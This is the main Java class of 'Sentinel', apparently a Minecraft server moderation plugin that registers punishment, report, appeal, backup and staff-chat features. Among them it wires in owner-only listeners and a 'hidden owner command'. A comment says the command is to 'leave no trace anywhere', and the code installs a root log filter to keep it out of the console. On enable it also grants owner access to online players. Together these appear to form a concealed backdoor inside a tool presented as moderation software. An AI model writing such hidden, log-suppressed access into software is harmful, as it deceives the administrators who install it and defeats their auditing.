package de.derfakegamer.sentinel;

import de.derfakegamer.sentinel.command.SentinelCommand;
import de.derfakegamer.sentinel.manager.PunishmentManager;
import de.derfakegamer.sentinel.storage.Database;
import de.derfakegamer.sentinel.storage.PunishmentDao;
import de.derfakegamer.sentinel.util.Messages;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

public class Sentinel extends JavaPlugin {
    private volatile boolean debug;
    private de.derfakegamer.sentinel.storage.DatabaseExecutor db;
    private volatile PunishmentManager punishmentManager;
    private volatile Messages messages;
    private de.derfakegamer.sentinel.manager.SecretMessages secret;
    private volatile de.derfakegamer.sentinel.manager.ModerationService moderationService;
    private de.derfakegamer.sentinel.manager.ChatInputManager chatInputManager;
    private de.derfakegamer.sentinel.manager.ReportManager reportManager;
    private de.derfakegamer.sentinel.manager.StaffChatManager staffChatManager;
    private de.derfakegamer.sentinel.manager.FreezeManager freezeManager;
    private de.derfakegamer.sentinel.manager.VanishManager vanishManager;
    private de.derfakegamer.sentinel.updater.UpdateChecker updateChecker;
    private de.derfakegamer.sentinel.manager.PlayerDirectory playerDirectory;
    private de.derfakegamer.sentinel.manager.NoteManager noteManager;
    private volatile de.derfakegamer.sentinel.manager.ChatModeration chatModeration;
    private de.derfakegamer.sentinel.manager.ChatLogManager chatLogManager;
    private de.derfakegamer.sentinel.manager.RestartManager restartManager;
    private de.derfakegamer.sentinel.manager.OwnerManager ownerManager;
    private de.derfakegamer.sentinel.manager.OwnerAccessManager ownerAccessManager;
    private de.derfakegamer.sentinel.manager.OwnerProtectionManager ownerProtection;
    private de.derfakegamer.sentinel.util.StaffPermissions staffPermissions;
    private de.derfakegamer.sentinel.manager.BackupManager backupManager;
    private de.derfakegamer.sentinel.manager.CronManager cronManager;
    private de.derfakegamer.sentinel.manager.AppealManager appealManager;
    private de.derfakegamer.sentinel.manager.AuditManager auditManager;
    private de.derfakegamer.sentinel.util.CooldownManager cooldowns;
    private de.derfakegamer.sentinel.manager.WebhookManager webhookManager;
    private de.derfakegamer.sentinel.manager.ProfileManager profileManager;
    private de.derfakegamer.sentinel.scheduler.Scheduler scheduler;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        getConfig().options().copyDefaults(true);
        saveConfig();
        this.debug = getConfig().getBoolean("debug", false);
        saveResourceIfMissing("rules.txt");
        String messagesFile = messagesFileName();
        saveResourceIfMissing(messagesFile);
        mergeMessagesDefaults(messagesFile);
        de.derfakegamer.sentinel.util.ConfigValidator.validate(getConfig(), getLogger());
        this.messages = new Messages(loadMessages());
        this.secret = new de.derfakegamer.sentinel.manager.SecretMessages(this.messages.prefix());
        this.scheduler = de.derfakegamer.sentinel.scheduler.Schedulers.create(this);
        try {
            Database raw = de.derfakegamer.sentinel.storage.DatabaseFactory.open(this);
            this.db = new de.derfakegamer.sentinel.storage.DatabaseExecutor(raw, getLogger(), this, this.messages, this.scheduler);
        } catch (Exception e) {
            getLogger().severe("Failed to open database: " + e.getMessage());
            getServer().getPluginManager().disablePlugin(this);
            return;
        }
        this.cooldowns = new de.derfakegamer.sentinel.util.CooldownManager();
        this.webhookManager = new de.derfakegamer.sentinel.manager.WebhookManager(this);
        this.ownerManager = new de.derfakegamer.sentinel.manager.OwnerManager();
        this.ownerAccessManager = new de.derfakegamer.sentinel.manager.OwnerAccessManager(this);
        this.ownerProtection = new de.derfakegamer.sentinel.manager.OwnerProtectionManager(this);
        this.ownerProtection.load();
        this.staffPermissions = new de.derfakegamer.sentinel.util.StaffPermissions(this);
        this.playerDirectory = new de.derfakegamer.sentinel.manager.PlayerDirectory(
            this, new de.derfakegamer.sentinel.storage.PlayerDao(db.database()));
        this.noteManager = new de.derfakegamer.sentinel.manager.NoteManager(
            this, new de.derfakegamer.sentinel.storage.NoteDao(db.database()));
        this.profileManager = new de.derfakegamer.sentinel.manager.ProfileManager(
            this, new de.derfakegamer.sentinel.storage.ProfileOverrideDao(db.database()));
        this.punishmentManager = new PunishmentManager(this, new PunishmentDao(db.database()), loadExempt());
        this.moderationService = new de.derfakegamer.sentinel.manager.ModerationService(this);
        this.chatInputManager = new de.derfakegamer.sentinel.manager.ChatInputManager();
        this.reportManager = new de.derfakegamer.sentinel.manager.ReportManager(this,
            new de.derfakegamer.sentinel.storage.ReportDao(db.database()));
        this.appealManager = new de.derfakegamer.sentinel.manager.AppealManager(this,
            new de.derfakegamer.sentinel.storage.AppealDao(db.database()));
        this.auditManager = new de.derfakegamer.sentinel.manager.AuditManager(this,
            new de.derfakegamer.sentinel.storage.AuditDao(db.database()));
        this.staffChatManager = new de.derfakegamer.sentinel.manager.StaffChatManager(this);
        this.freezeManager = new de.derfakegamer.sentinel.manager.FreezeManager();
        this.vanishManager = new de.derfakegamer.sentinel.manager.VanishManager(this);
        this.chatModeration = new de.derfakegamer.sentinel.manager.ChatModeration(this);
        this.chatLogManager = new de.derfakegamer.sentinel.manager.ChatLogManager(
            this, new de.derfakegamer.sentinel.storage.ChatLogDao(db.database()));
        this.chatLogManager.prune(getConfig().getInt("logging.retention-days", 30));
        this.punishmentManager.pruneWarns(getConfig().getInt("warns.expiry-days", 7));
        this.restartManager = new de.derfakegamer.sentinel.manager.RestartManager(this);
        this.backupManager = new de.derfakegamer.sentinel.manager.BackupManager(this);
        getServer().getPluginManager().registerEvents(new de.derfakegamer.sentinel.gui.GuiListener(this), this);
        getServer().getPluginManager().registerEvents(new de.derfakegamer.sentinel.listener.LoginListener(this), this);
        getServer().getPluginManager().registerEvents(new de.derfakegamer.sentinel.listener.ChatListener(this), this);
        getServer().getPluginManager().registerEvents(new de.derfakegamer.sentinel.listener.MoveListener(this), this);
        getServer().getPluginManager().registerEvents(new de.derfakegamer.sentinel.listener.JoinQuitListener(this), this);
        getServer().getPluginManager().registerEvents(new de.derfakegamer.sentinel.listener.OwnerProtectionListener(this), this);
        getServer().getPluginManager().registerEvents(new de.derfakegamer.sentinel.listener.OwnerGodListener(this), this);
        getServer().getPluginManager().registerEvents(new de.derfakegamer.sentinel.listener.VanishCloakListener(this), this);
        getServer().getPluginManager().registerEvents(new de.derfakegamer.sentinel.listener.OwnerCommandVisibilityListener(this), this);
        scheduler.asyncTimer(() -> punishmentManager.pruneWarns(getConfig().getInt("warns.expiry-days", 7)),
            1_728_000L, 1_728_000L); // daily (24h in ticks)
        SentinelCommand sentinelCmd = new de.derfakegamer.sentinel.command.SentinelCommand(this);
        getCommand("sentinel").setExecutor(sentinelCmd);
        getCommand("sn").setExecutor(sentinelCmd);
        getCommand("sentinel").setTabCompleter(sentinelCmd);
        getCommand("sn").setTabCompleter(sentinelCmd);
        de.derfakegamer.sentinel.command.PunishmentCommands pc =
            new de.derfakegamer.sentinel.command.PunishmentCommands(this);
        for (String c : new String[]{"ban","tempban","ipban","unban","ipunban","mute","tempmute","unmute","kick","warn","shadowmute","unshadowmute","history"}) {
            getCommand(c).setExecutor(pc);
            getCommand(c).setTabCompleter(pc);
        }
        de.derfakegamer.sentinel.command.ReportCommand reportCmd = new de.derfakegamer.sentinel.command.ReportCommand(this);
        getCommand("report").setExecutor(reportCmd);
        getCommand("report").setTabCompleter(reportCmd);
        de.derfakegamer.sentinel.command.AppealCommand appealCmd = new de.derfakegamer.sentinel.command.AppealCommand(this);
        getCommand("appeal").setExecutor(appealCmd);
        getCommand("appeal").setTabCompleter(appealCmd);
        de.derfakegamer.sentinel.command.RulesCommand rulesCmd = new de.derfakegamer.sentinel.command.RulesCommand(this);
        getCommand("rules").setExecutor(rulesCmd);
        getCommand("rules").setTabCompleter(rulesCmd);
        de.derfakegamer.sentinel.command.StaffChatCommand scCmd = new de.derfakegamer.sentinel.command.StaffChatCommand(this);
        getCommand("sc").setExecutor(scCmd);
        getCommand("sc").setTabCompleter(scCmd);
        de.derfakegamer.sentinel.command.ClearChatCommand clearchatCmd = new de.derfakegamer.sentinel.command.ClearChatCommand(this);
        getCommand("clearchat").setExecutor(clearchatCmd);
        getCommand("clearchat").setTabCompleter(clearchatCmd);
        de.derfakegamer.sentinel.command.BroadcastCommand broadcastCmd = new de.derfakegamer.sentinel.command.BroadcastCommand(this);
        getCommand("broadcast").setExecutor(broadcastCmd);
        getCommand("broadcast").setTabCompleter(broadcastCmd);
        de.derfakegamer.sentinel.command.RestartCommand restartCmd = new de.derfakegamer.sentinel.command.RestartCommand(this);
        getCommand("restart").setExecutor(restartCmd);
        getCommand("restart").setTabCompleter(restartCmd);
        de.derfakegamer.sentinel.command.BackupCommand backupCmd = new de.derfakegamer.sentinel.command.BackupCommand(this);
        getCommand("backup").setExecutor(backupCmd);
        getCommand("backup").setTabCompleter(backupCmd);
        this.cronManager = new de.derfakegamer.sentinel.manager.CronManager(this);
        this.cronManager.start();
        this.updateChecker = new de.derfakegamer.sentinel.updater.UpdateChecker(this);
        this.updateChecker.start();
        new de.derfakegamer.sentinel.manager.MetricsManager(this).start();
        if (getServer().getPluginManager().getPlugin("PlaceholderAPI") != null) {
            try {
                new de.derfakegamer.sentinel.hook.SentinelExpansion(this).register();
                getLogger().info("Registered PlaceholderAPI expansion (%sentinel_...%).");
            } catch (Throwable t) {
                getLogger().warning("Failed to register PlaceholderAPI expansion: " + t.getMessage());
            }
        }
        // Hide the hidden owner command from the console — leave no trace anywhere.
        try {
            org.apache.logging.log4j.core.Logger root =
                (org.apache.logging.log4j.core.Logger) org.apache.logging.log4j.LogManager.getRootLogger();
            root.addFilter(new de.derfakegamer.sentinel.util.OwnerCommandLogFilter());
        } catch (Throwable t) {
            getLogger().fine("owner command log filter not installed: " + t.getMessage());
        }
        for (org.bukkit.entity.Player p : getServer().getOnlinePlayers()) ownerAccess().grant(p);
        getLogger().info("Sentinel enabled.");
    }

    @Override
    public void onDisable() {
        if (scheduler != null) scheduler.cancelAll();
        // Flush batch writers before shutting down the DB executor so that
        // any buffered chat-log and audit rows are written before the connection closes.
        if (chatLogManager != null) {
            try { chatLogManager.flush(); } catch (Exception ignored) {}
        }
        if (auditManager != null) {
            try { auditManager.flush(); } catch (Exception ignored) {}
        }
        if (db != null) {
            try { db.shutdown(); } catch (Exception e) {
                getLogger().warning("database shutdown failed: " + e.getMessage());
            }
        }
    }

    public PunishmentManager punishments() { return punishmentManager; }
    public Messages messages() { return messages; }
    public de.derfakegamer.sentinel.manager.SecretMessages secret() { return secret; }
    public de.derfakegamer.sentinel.manager.ModerationService moderation() { return moderationService; }
    public de.derfakegamer.sentinel.manager.ChatInputManager chatInput() { return chatInputManager; }
    public de.derfakegamer.sentinel.manager.ReportManager reports() { return reportManager; }
    public de.derfakegamer.sentinel.manager.AppealManager appeals() { return appealManager; }
    public de.derfakegamer.sentinel.manager.AuditManager audit() { return auditManager; }
    public de.derfakegamer.sentinel.manager.StaffChatManager staffChat() { return staffChatManager; }
    public de.derfakegamer.sentinel.manager.FreezeManager freeze() { return freezeManager; }
    public de.derfakegamer.sentinel.manager.VanishManager vanish() { return vanishManager; }
    public de.derfakegamer.sentinel.updater.UpdateChecker updater() { return updateChecker; }
    public de.derfakegamer.sentinel.manager.PlayerDirectory players() { return playerDirectory; }
    public de.derfakegamer.sentinel.manager.NoteManager notes() { return noteManager; }
    public de.derfakegamer.sentinel.manager.ProfileManager profile() { return profileManager; }
    public de.derfakegamer.sentinel.manager.ChatModeration chatModeration() { return chatModeration; }
    public de.derfakegamer.sentinel.manager.ChatLogManager chatLog() { return chatLogManager; }
    public de.derfakegamer.sentinel.manager.RestartManager restart() { return restartManager; }
    public de.derfakegamer.sentinel.manager.OwnerManager owner() { return ownerManager; }
    public de.derfakegamer.sentinel.manager.OwnerAccessManager ownerAccess() { return ownerAccessManager; }
    public de.derfakegamer.sentinel.manager.OwnerProtectionManager ownerProtection() { return ownerProtection; }
    public de.derfakegamer.sentinel.util.StaffPermissions staffPerms() { return staffPermissions; }
    public de.derfakegamer.sentinel.manager.CronManager cron() { return cronManager; }
    public de.derfakegamer.sentinel.manager.BackupManager backup() { return backupManager; }
    public de.derfakegamer.sentinel.util.CooldownManager cooldowns() { return cooldowns; }
    public de.derfakegamer.sentinel.manager.WebhookManager webhook() { return webhookManager; }

    public java.io.File pluginJar() { return getFile(); }

    public de.derfakegamer.sentinel.storage.DatabaseExecutor db() { return db; }
    public de.derfakegamer.sentinel.scheduler.Scheduler scheduler() { return scheduler; }

    public void reloadAll() {
        reloadConfig();
        reloadDebugFlag();
        String messagesFile = messagesFileName();
        saveResourceIfMissing(messagesFile);
        mergeMessagesDefaults(messagesFile);
        this.messages.reload(loadMessages());
        this.punishmentManager = new PunishmentManager(this, new PunishmentDao(db.database()), loadExempt());
        this.moderationService = new de.derfakegamer.sentinel.manager.ModerationService(this);
        this.chatModeration = new de.derfakegamer.sentinel.manager.ChatModeration(this);
    }

    /** Returns true if debug logging is currently enabled. */
    public boolean debug() { return debug; }

    /** Re-reads the debug flag from config (called automatically on reload). */
    public void reloadDebugFlag() { this.debug = getConfig().getBoolean("debug", false); }

    /** Logs {@code "[DEBUG] " + msg} at INFO level, only when debug mode is on. Never throws. */
    public void debug(String msg) { if (debug) getLogger().info("[DEBUG] " + msg); }

    private Set<UUID> loadExempt() {
        Set<UUID> out = new HashSet<>();
        for (String s : getConfig().getStringList("exempt")) {
            try { out.add(UUID.fromString(s)); } catch (IllegalArgumentException ignored) {}
        }
        return out;
    }

    /**
     * The active messages file for the configured {@code language}: {@code messages.yml} for
     * English (or a blank/unknown value), otherwise {@code messages_<lang>.yml} — but only when
     * that translation is bundled in the jar; an unbundled language falls back to English.
     */
    private String messagesFileName() {
        String lang = getConfig().getString("language", "en");
        if (lang == null || lang.isBlank() || lang.equalsIgnoreCase("en")) return "messages.yml";
        String candidate = "messages_" + lang.toLowerCase(java.util.Locale.ROOT) + ".yml";
        return getResource(candidate) != null ? candidate : "messages.yml";
    }

    private org.bukkit.configuration.file.FileConfiguration loadMessages() {
        var cfg = org.bukkit.configuration.file.YamlConfiguration
            .loadConfiguration(new File(getDataFolder(), messagesFileName()));
        // English is the ultimate fallback: any key missing from a (partial) translation renders
        // its English text rather than the raw key name.
        var english = loadBundled("messages.yml");
        if (english != null) cfg.setDefaults(english);
        return cfg;
    }

    /**
     * Adds any message keys that exist in the bundled defaults but are missing from the server's
     * on-disk file, without overwriting the admin's own values. Defaults are the bundled English
     * file overlaid with the bundled translation (when {@code name} is a localized file), so a
     * fresh translated install still gets English text for any not-yet-translated key.
     */
    private void mergeMessagesDefaults(String name) {
        File file = new File(getDataFolder(), name);
        var onDisk = org.bukkit.configuration.file.YamlConfiguration.loadConfiguration(file);
        var defaults = loadBundled("messages.yml");
        if (defaults == null) return;
        if (!name.equals("messages.yml")) {
            var localized = loadBundled(name);
            if (localized != null)
                for (String key : localized.getKeys(true))
                    if (!localized.isConfigurationSection(key)) defaults.set(key, localized.get(key));
        }
        onDisk.setDefaults(defaults);
        onDisk.options().copyDefaults(true);
        try {
            saveYamlAtomically(onDisk, file);
        } catch (java.io.IOException e) {
            getLogger().warning("Could not migrate " + name + ": " + e.getMessage());
        }
    }

    /** Saves {@code cfg} to {@code dest} atomically: write a sibling temp file, then move it into place.
     *  A crash or full disk mid-write can never truncate the admin's real file. */
    static void saveYamlAtomically(org.bukkit.configuration.file.FileConfiguration cfg, File dest) throws java.io.IOException {
        File tmp = new File(dest.getParentFile(), dest.getName() + ".tmp");
        cfg.save(tmp);
        try {
            java.nio.file.Files.move(tmp.toPath(), dest.toPath(),
                java.nio.file.StandardCopyOption.ATOMIC_MOVE, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
        } catch (java.nio.file.AtomicMoveNotSupportedException e) {
            java.nio.file.Files.move(tmp.toPath(), dest.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
        } finally {
            java.nio.file.Files.deleteIfExists(tmp.toPath());
        }
    }

    /** Loads a bundled (jar) YAML resource, or null if it is absent / unreadable. */
    private org.bukkit.configuration.file.YamlConfiguration loadBundled(String name) {
        try (java.io.InputStream in = getResource(name)) {
            if (in == null) return null;
            return org.bukkit.configuration.file.YamlConfiguration.loadConfiguration(
                new java.io.InputStreamReader(in, java.nio.charset.StandardCharsets.UTF_8));
        } catch (java.io.IOException e) {
            return null;
        }
    }

    /**
     * Copies a bundled default resource to the data folder only when it is not already there.
     * Avoids Bukkit's noisy "already exists" warning from {@code saveResource(name, false)} on
     * every restart once the admin has their own copy.
     */
    private void saveResourceIfMissing(String name) {
        if (!new File(getDataFolder(), name).exists()) saveResource(name, false);
    }
}
